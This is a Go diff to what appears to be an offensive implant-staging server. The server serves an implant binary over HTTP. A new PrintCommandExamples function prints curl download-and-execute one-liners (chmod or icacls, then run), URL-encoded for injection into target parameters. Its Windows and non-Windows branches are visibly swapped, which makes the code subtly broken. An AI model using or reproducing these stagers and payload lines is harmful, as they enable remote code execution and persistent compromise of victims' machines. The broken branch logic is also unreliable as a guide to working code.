@@ -45,6 +45,10 @@ func New(lhost, lport, bindAddr, bindPort, targetOS, arch string) *Server {
 	randomPlant := plants[rand.Intn(len(plants))]
 	plantPath := "/" + strings.ToLower(randomPlant)
 
+	if targetOS == "windows" {
+		plantPath += ".exe"
+	}
+
 	return &Server{
 		lhost:     lhost,
 		lport:     lport,
@@ -66,19 +70,13 @@ func (s *Server) Start() error {
 
 	// Afficher les informations du serveur
 	fmt.Println(Banner)
+
 	fmt.Printf("🪴Listen on:   http://%s%s\n", addr, s.plantPath)
 	fmt.Printf("\n🪴 Implant : %s/%s --> %s:%s\n", s.targetOS, s.arch, s.lhost, s.lport)
 	// fmt.Printf("   - Listener: %s:%s\\n", s.lhost, s.lport)
 	// fmt.Printf("   - Platform: %s/%s\\n", s.targetOS, s.arch)
 	fmt.Printf("\n\n🪴 Payloads : \n")
-	curlLine := fmt.Sprintf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
-	curlAndExecLine := fmt.Sprintf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
-	fmt.Print(curlLine)
-	fmt.Print(curlAndExecLine)
-	fmt.Print("Url encoded : \n")
-	fmt.Print(url.QueryEscape(curlLine) + "\n")
-	fmt.Print(url.QueryEscape(curlAndExecLine) + "\n")
-	fmt.Printf("\n")
+	PrintCommandExamples(s)
 
 	return s.httpServer.ListenAndServe()
 }
@@ -151,6 +149,28 @@ func (s *Server) handleImplant(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Disposition", "attachment; filename=implant")
 		w.Write(implantData)
 	}
+}
+
+func PrintCommandExamples(s *Server) {
+
+	fmt.Printf("\n\n🪴 Payloads : \n")
+	curlLine := ""
+	curlAndExecLine := ""
+
+	if s.targetOS == "windows" {
+		curlLine = fmt.Sprintf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
+		curlAndExecLine = fmt.Sprintf("curl http://%s:%s%s -O && chmod +x %s && ./%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
+	} else {
+		curlLine = fmt.Sprintf("curl http://%s:%s%s -O\n", s.lhost, s.bindPort, s.plantPath)
+		curlAndExecLine = fmt.Sprintf("curl http://%s:%s%s -O && icacls /grant Everyone:RX %s && .\\%s\n", s.lhost, s.bindPort, s.plantPath, s.plantPath[1:], s.plantPath[1:])
+
+	}
+	fmt.Print(curlLine)
+	fmt.Print(curlAndExecLine)
+	fmt.Print("Url encoded : \n")
+	fmt.Print(url.QueryEscape(curlLine) + "\n")
+	fmt.Print(url.QueryEscape(curlAndExecLine) + "\n")
+	fmt.Printf("\n")
 }
 
 // logRequest enregistre une requête avec l'heure et l'IP
